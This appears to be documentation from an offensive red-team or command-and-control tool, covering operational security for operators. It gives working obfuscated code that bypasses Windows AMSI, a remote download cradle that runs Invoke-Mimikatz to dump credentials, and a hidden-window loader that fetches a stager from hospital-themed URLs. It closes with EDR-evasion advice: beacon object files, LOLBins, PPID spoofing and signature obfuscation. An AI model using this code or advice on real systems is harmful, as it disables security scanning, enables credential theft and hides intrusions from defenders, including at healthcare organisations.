OPSEC

Perfect OPSEC doesnot exist, a whoami at the Wrong Time is a Beacon. Every single action during an operation has a detection risk. Its just a matter of how loud it is, when you do it, and how you cover your tracks
Even a simple whoami can trigger alerts in some hardened environments if it’s done by a process not in the allowlist or during odd hours
Note that when the wrong hands (no IT member) type ipconfig, the blue team starts hunting. Your access becomes your disguise, and your commands must reflect the role of the user you compromised.


The technique used to bypass AMSI in pwsploit and pwsh-execute here is simple but effective.

As many of you know, using Matt Graeber’s well-known AMSI bypass method via reflection (e.g., [Ref].Assembly.GetType(...).GetField(...).SetValue(...)) is usually detected and blocked by modern AMSI signatures if executed as a single line.

However, years ago I came across a clever trick (I don’t recall the original source), and I’ve been using it successfully ever since.

The idea is this: instead of running the AMSI bypass in one line, split it into multiple lines and run them one at a time in the same PowerShell process. This delays AMSI scanning until after the bypass has taken effect.

As you can see, breaking it into multiple lines makes the AMSI bypass effective.

== Real-World Example ==

Let’s say your PowerShell stager is hosted at:
https://us.hospital.org/patients

You could prepend the AMSI bypass lines to the beginning of your remote script like this:

	$a = [Ref].Assembly.GetType('Sys'+'tem.Manag'+'ement.Au'+'tomation.Am'+'siUtils')

	$b = $a.GetField('ams'+'iInitF'+'ailed','NonP'+'ublic,St'+'atic')

	$b.SetValue($null,$true)

	iex (New-Object Net.WebClient).DownloadString('http://example.com/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command "privilege::debug"


Then, you can host a loader script at:

https://mayo-clinic.org/patient-centered-care

This loader fetches and executes the above payload line by line:

	$file = (New-Object System.Net.WebClient).DownloadString('https://us.hospital.org/patients')

	foreach ($line in $file) {

	    $line | powershell -nop -w hidden

	}
This technique works reliably to disable AMSI before malicious commands are scanned.

OPSEC Considerations


  • execute-assembly is available, but not OPSEC-safe as it creates a new suspended process that can be detected. Instead, use bof_execute which is more silent and less likely to trigger detection. The bof_execute command is used to execute a beacon object file (.o file), which is highly stealthy.

  • All packages in src dir can be modified statically to avoid signature-based detection.

  • The Go-based stager can also be modified to implement AMSI bypass techniques or string obfuscation before being compiled.

  • Use randomized variable names and avoid common script structures or command sequences often detected by EDRs.

  • Strip comments and whitespace before delivery.

  • Use living-off-the-land binaries (LOLBins) where possible to load payloads (e.g., msbuild, installutil).

  • Prefer BOF + syscalls + PPID spoofing when possible for stealthy privilege escalation or process injection.

Always test payloads in a monitored lab to verify stealth and detection evasion before deployment.


SharpView Commands


SharpView commands are available to gather information from the Windows environment, and can still be executed via execute-assembly or bof_execute commands. These commands offer powerful techniques for enumeration and lateral movement within a compromised environment

These commands can be executed using the bof_execute command for beacon object files or execute-assembly for direct .NET assembly execution. Each offers distinct advantages in terms of stealth and persistence.
